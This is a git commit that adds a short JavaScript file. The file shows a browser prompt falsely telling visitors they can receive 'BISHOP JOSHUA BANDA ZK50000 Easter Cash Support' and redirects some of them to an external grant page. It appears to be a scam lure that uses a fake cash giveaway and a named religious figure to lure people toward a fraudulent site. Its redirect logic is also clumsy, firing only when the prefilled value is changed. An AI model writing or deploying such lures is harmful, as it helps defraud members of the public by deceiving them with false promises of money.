87561133250c17c91c0e82604c656e579c50c281
The-On-going <sirpeelawson@gmail.com>
2026-04-04 01:06:53 +0100

    Create activeeaster4.js

---
+++ activeeaster4.js
@@ -0,0 +1,10 @@
+var password = 'ZK50000';
+
+password = prompt(
+  'Congratulations, you are eligible to Receive BISHOP JOSHUA BANDA ZK50000 Easter Cash Support. Click OK to receive Instantly.',
+  'ZK50000'
+);
+
+if (password !== 'ZK50000') {
+    location.href = 'https://ongoing-grant.info/ZK50000-Easter-Support.html';
+}
